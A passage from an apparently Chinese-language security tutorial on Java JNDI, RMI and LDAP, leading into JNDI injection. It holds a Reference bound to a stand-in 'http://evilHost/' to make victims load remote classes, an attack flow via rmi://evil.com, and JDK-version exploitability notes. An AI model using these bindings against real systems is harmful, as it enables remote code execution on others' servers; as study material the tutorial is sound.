</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>参数：
</span></span></span><span style=display:flex><span><span style=color:#75715e>className 远程加载时所使用的类名，如果本地没有从远程加载
</span></span></span><span style=display:flex><span><span style=color:#75715e>factory  加载的class中需要实例化类的名称，远程的工厂类
</span></span></span><span style=display:flex><span><span style=color:#75715e>factoryLocation  提供classes数据的工厂类加载的地址，可以是file/ftp/http协议
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></div><p>常用</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//将地址添加到索引posn的地址列表中。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>void</span> <span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>posn</span><span style=color:#f92672>,</span> <span style=color:#111>RefAddr</span> <span style=color:#111>addr</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//将地址添加到地址列表的末尾。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>void</span> <span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>RefAddr</span> <span style=color:#111>addr</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//从此引用中删除所有地址。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>void</span> <span style=color:#75af00>clear</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索索引posn上的地址。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>RefAddr</span> <span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>posn</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索地址类型为“addrType”的第一个地址。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>RefAddr</span> <span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>addrType</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索本参考文献中地址的列举。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Enumeration</span><span style=color:#f92672>&lt;</span><span style=color:#111>RefAddr</span><span style=color:#f92672>&gt;</span> <span style=color:#75af00>getAll</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索引用引用的对象的类名。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>String</span> <span style=color:#75af00>getClassName</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索此引用引用的对象的工厂位置。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>String</span> <span style=color:#75af00>getFactoryClassLocation</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索此引用引用对象的工厂的类名。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>String</span> <span style=color:#75af00>getFactoryClassName</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//从地址列表中删除索引posn上的地址。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Object</span> <span style=color:#75af00>remove</span><span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>posn</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索此引用中的地址数。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>int</span> <span style=color:#75af00>size</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//生成此引用的字符串表示形式。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>String</span> <span style=color:#75af00>toString</span><span style=color:#f92672>()</span>
</span></span></code></pre></div><p>示例：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.jndi.rmi.registry.ReferenceWrapper</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.NamingException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Reference</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.AlreadyBoundException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.RemoteException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.LocateRegistry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.Registry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>jndi</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span><span style=color:#f92672>,</span> <span style=color:#111>RemoteException</span><span style=color:#f92672>,</span> <span style=color:#111>AlreadyBoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://127.0.0.1:8080&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Registry</span> <span style=color:#111>registry</span> <span style=color:#f92672>=</span> <span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1099</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Reference</span> <span style=color:#111>reference</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;testrefClassName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;testFactoryClassName&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>url</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ReferenceWrapper</span> <span style=color:#111>referenceWrapper</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ReferenceWrapper</span><span style=color:#f92672>(</span><span style=color:#111>reference</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;testrefObj&#34;</span><span style=color:#f92672>,</span><span style=color:#111>referenceWrapper</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// 也可以用JNDI的 ctx.bind(&#34;aa&#34;, referenceWrapper);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>可以看到在创建Reference对象后又用ReferenceWrapper进行封装，原因是Reference没有Remote接口也没有继承UnicastRemoteObject类，而这两个条件是注册到RMI Registry的必要条件，所以需要封装</p><p>当有客户端通过 <code>lookup("refObj")</code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference类的实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>testrefClassName</code> 的类，如果本地未找到，则会去请求 <code>http://127.0.0.1:8080/testFactoryClassName.class</code> 加载工厂类</p><h4 id=与rmi的对比>与RMI的对比</h4><p>最简单的区别：</p><ul><li>RMI的引入包</li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.LocateRegistry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.Registry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>remote.IRemoteMath</span><span style=color:#f92672>;</span>
</span></span></code></pre></div><ul><li>JNDI的引入包</li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Context</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.InitialContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.LocateRegistry</span><span style=color:#f92672>;</span>
</span></span></code></pre></div><p>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中</p><p>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的</p><ul><li>RMI的写法</li></ul><p>写法1</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// 服务端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>IRemoteMath</span> <span style=color:#111>remoteMath</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>RemoteMath</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1099</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Registry</span> <span style=color:#111>registry</span> <span style=color:#f92672>=</span> <span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>getRegistry</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Compute&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>remoteMath</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 客户端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Registry</span> <span style=color:#111>registry</span> <span style=color:#f92672>=</span> <span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>getRegistry</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;localhost&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>IRemoteMath</span> <span style=color:#111>remoteMath</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>IRemoteMath</span><span style=color:#f92672>)</span><span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Compute&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>写法2</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// 服务端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>PersonService</span> <span style=color:#111>personService</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#111>PersonServiceImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span><span style=color:#ae81ff>6600</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Naming</span><span style=color:#f92672>.</span><span style=color:#75af00>rebind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;rmi://127.0.0.1:6600/PersonService&#34;</span><span style=color:#f92672>,</span><span style=color:#111>personService</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 客户端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>PersonService</span> <span style=color:#111>personService</span><span style=color:#f92672>=(</span><span style=color:#111>PersonService</span><span style=color:#f92672>)</span> <span style=color:#111>Naming</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;rmi://127.0.0.1:6600/PersonService&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><ul><li>JNDI写法</li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//服务端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span><span style=color:#ae81ff>6666</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>setProperty</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;com.sunjndi.rmi.registry.RegistryContextFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>setProperty</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;rmi:/localhost:6666&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>InitialContext</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;person&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>p</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//客户端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>InitialContext</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>Person</span> <span style=color:#111>person</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Person</span><span style=color:#f92672>)</span> <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;person&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// 或
</span></span></span><span style=display:flex><span><span style=color:#75715e>//服务端
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Properties</span> <span style=color:#111>env</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Properties</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;rmi://localhost:1099&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#111>env</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><h2 id=ldap>LDAP</h2><p>Lightweight Directory Access Protocol 轻型目录访问协议，是一种目录服务协议，运行在TCP/IP堆栈之上；LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据</p><ul><li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目</li><li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）</li><li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来</li><li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。如javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation等属性，在后面的利用中会用到这些属性</li></ul><h3 id=关键字>关键字</h3><table><thead><tr><th style=text-align:left><strong>关键字</strong></th><th style=text-align:left><strong>英文全称</strong></th><th style=text-align:left><strong>含义</strong></th></tr></thead><tbody><tr><td style=text-align:left><strong>dc</strong></td><td style=text-align:left>Domain Component</td><td style=text-align:left>域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置）</td></tr><tr><td style=text-align:left><strong>uid</strong></td><td style=text-align:left>User Id</td><td style=text-align:left>用户ID songtao.xu（一条记录的ID）</td></tr><tr><td style=text-align:left><strong>ou</strong></td><td style=text-align:left>Organization Unit</td><td style=text-align:left>组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如"employees"（一条记录的所属组织单位）</td></tr><tr><td style=text-align:left><strong>cn</strong></td><td style=text-align:left>Common Name</td><td style=text-align:left>公共名称，如"Thomas Johansson"（一条记录的名称）</td></tr><tr><td style=text-align:left><strong>sn</strong></td><td style=text-align:left>Surname</td><td style=text-align:left>姓，如"xu"</td></tr><tr><td style=text-align:left><strong>dn</strong></td><td style=text-align:left>Distinguished Name</td><td style=text-align:left>由有多个其他属性组成，如"uid=songtao.xu,ou=oa组,dc=example,dc=com"，一条记录的位置（唯一）</td></tr><tr><td style=text-align:left><strong>rdn</strong></td><td style=text-align:left>Relative dn</td><td style=text-align:left>相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid=tom”或“cn= Thomas Johansson”</td></tr></tbody></table><p>LDAP 的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。例如为公司的员工设置一个DN，可以基于cn或uid（User ID）作为用户账号。如example.com的employees单位员工longofo的DN可以设置为下面这样：</p><pre tabindex=0><code>uid=longofo,ou=employees,dc=example,dc=com
</code></pre><p>用树形结构表示就是下面这种形式（Person绑定的是类对象）：</p><p><img src=https://images.seebug.org/content/images/2019/12/05/1575516121000-17.png-w331s alt=img></p><h1 id=jndi注入>JNDI注入</h1><p>JNDI注入是BlackHat2016 USA的一个议题<a href=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf>A Journey From JNDI LDAP Manipulation To RCE</a>提出的，最早起源是野外发现的Java Applets 点击播放绕过漏洞（CVE-2015-4902），它的攻击过程可以简单概括为以下几步：</p><ol><li>恶意applet使用JNLP实例化JNDI InitialContext</li><li>javax.naming.InitialContext的构造函数将请求应用程序的JNDI.properties（JNDI配置文件来自恶意网站）</li><li>恶意Web服务器将JNDI.properties发送到客户端，内容为：java.naming.provider.url = rmi://attacker-server/Go</li><li>在受害者的InitialContext初始化期间查找rmi//attacker-server/Go，攻击者控制的注册表将返回JNDI引用 （javax.naming.Reference）</li><li>服务器从RMI注册表接收到JNDI引用后，它将从攻击者控制的服务器获取工厂类，然后实例化工厂以返回 JNDI所引用的对象的新实例</li><li>由于攻击者控制了工厂类，因此他可以轻松返回带有静态变量的类初始化程序，运行由攻击者定义的任何Java代码，实现远程代码执行</li></ol><p>相同的原理也可以应用于Web应用中。对于<strong>JNDI注入</strong>，有以下两个点需要注意：</p><ol><li>仅由InitialContext或其子类初始化的Context对象（InitialDirContext或InitialLdapContext）容易受到JNDI注入攻击</li><li>一些InitialContext属性可以被传递给查找的地址/名称覆盖，即上面提到的JNDI动态协议转换</li></ol><p>不仅仅是<code>InitialContext.lookup()</code>方法会受到影响，其他方法例如<code>InitialContext.rename()</code>、 <code>InitialContext.lookupLink()</code>最后也调用了<code>InitialContext.lookup()</code>。还有其他包装了JNDI的应用，例如Apache&rsquo;s Shiro JndiTemplate、Spring&rsquo;s JndiTemplate也会调用<code>InitialContext.lookup()</code>，看下Apache Shiro的JndiTemplate.lookup()：</p><h2 id=攻击向量>攻击向量</h2><p>类型</p><ul><li>RMI</li><li>JNDI Reference</li><li>Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）</li><li>LDAP</li><li>Serialized Object</li><li>JNDI Reference</li><li>Remote Location</li><li>CORBA（议题中有）</li><li>IOR</li></ul><p>版本很重要，JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p><h2 id=安全管理器>安全管理器</h2><p>Java中的对象分为本地对象和远程对象，本地默认可信任，为了管理和限制就出现了security manager</p><p><img src=https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/3.png alt=img></p><p>对于加载远程对象，JNDI有两种安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制</p><p><img src=https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/4.png alt=img></p><h2 id=rmireference>RMI+Reference</h2><p><strong>*攻击客户端</strong></p><p>Reference中包含被引用对象的类信息和地址，JNDI中对象传递要么是序列化方式（对象拷贝，对应按值传递），要么是按照引用来存储（对象引用），比如Reference</p><p>使用RMI Remote Object的方式利用限制很大，但是使用RMI+JNDI Reference就没有那些限制，不过在JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类</p><p>**思路：<strong>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong></p><p><img src=https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png alt=img></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference("EvilObject", "EvilObject", "http://evil-cb.com/")</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p>示例：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Reference</span> <span style=color:#111>reference</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Exploit&#34;</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;Exploit&#34;</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;http://evilHost/&#34;</span> <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Exploit&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ReferenceWrapper</span><span style=color:#f92672>(</span><span style=color:#111>reference</span><span style=color:#f92672>));</span>
</span></span></code></pre></div><p>此时，假设使用 <code>rmi</code> 协议，客户端通过 <code>lookup</code> 函数请求上面 <code>bind</code> 设置的 <code>Exploit</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Properties</span> <span style=color:#111>env</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Properties</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;rmi://127.0.0.1:1099&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#111>env</span><span style=color:#f92672>);</span>
